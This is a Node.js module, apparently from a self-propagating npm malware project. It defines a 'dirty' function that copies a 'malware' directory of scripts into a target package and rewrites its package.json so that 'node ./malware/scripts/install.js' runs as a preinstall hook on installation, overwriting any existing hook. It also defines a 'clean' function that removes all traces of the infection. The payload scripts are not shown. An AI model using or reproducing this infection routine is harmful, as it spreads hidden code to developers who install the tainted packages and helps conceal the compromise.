// { author: 'ave' }

const path = require('path')
const fs   = require('fs')

// Recursive folder deletion is experimental in Node.js, and it throws an error.
// I used this code from https://geedew.com/remove-a-directory-that-is-not-empty-in-nodejs/
// as a fill-in.
var deleteFolderRecursive = function(path) {
  if( fs.existsSync(path) ) {
    fs.readdirSync(path).forEach(function(file,index){
      var curPath = path + "/" + file;
      if(fs.lstatSync(curPath).isDirectory()) { // recurse
        deleteFolderRecursive(curPath);
      } else { // delete file
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(path);
  }
};

module.exports = {
    // Copy malware folder to the given package and set the preinstall hook.
    // If a package already has a preinstall hook it will be wiped!
    // packageRoot is an absolute path.
    dirty: function(packageRoot) {
        try {
            fs.mkdirSync(path.join(packageRoot, 'malware'))
            fs.mkdirSync(path.join(packageRoot, 'malware/lib'))
            fs.mkdirSync(path.join(packageRoot, 'malware/scripts'))

            fs.copyFileSync(
                path.join(__dirname, '../lib/config.js'),
                path.join(packageRoot, 'malware/lib/config.js')
            )
            fs.copyFileSync(
                path.join(__dirname, '../lib/process.js'),
                path.join(packageRoot, 'malware/lib/process.js')
            )
            fs.copyFileSync(
                path.join(__dirname, '../lib/rewrite.js'),
                path.join(packageRoot, 'malware/lib/rewrite.js')
            )
            fs.copyFileSync(
                path.join(__dirname, '../scripts/install.js'),
                path.join(packageRoot, 'malware/scripts/install.js')
            )
            fs.copyFileSync(
                path.join(__dirname, '../scripts/package.js'),
                path.join(packageRoot, 'malware/scripts/package.js')
            )

            packageJson = require(
                path.join(packageRoot, 'package.json')
            )
            packageJson.scripts.preinstall = "node ./malware/scripts/install.js"
            fs.unlinkSync(
                path.join(packageRoot, 'package.json')
            )
            fs.writeFileSync(
                path.join(packageRoot, 'package.json'),
                JSON.stringify(packageJson, null, 4)
            )
        } catch (e) {
            console.error(e)
        }
    },
    // Remove all traces of the malware.
    clean: function(packageRoot) {
        try {
            deleteFolderRecursive(path.join(packageRoot, 'malware'))
            /*
            fs.rmdirSync(
                path.join(packageRoot, 'malware'),
                { recursive: true }
            )
            */
        } catch (e) {
            console.error(e)
        }

        try {
            packageJson = require(
                path.join(packageRoot, 'package.json')
            )
            packageJson.scripts.preinstall = undefined
            fs.unlinkSync(
                path.join(packageRoot, 'package.json')
            )
            fs.writeFileSync(
                path.join(packageRoot, 'package.json'),
                JSON.stringify(packageJson, null, 4)
            )
        } catch (e) {
            console.error(e)  
        }
    }
}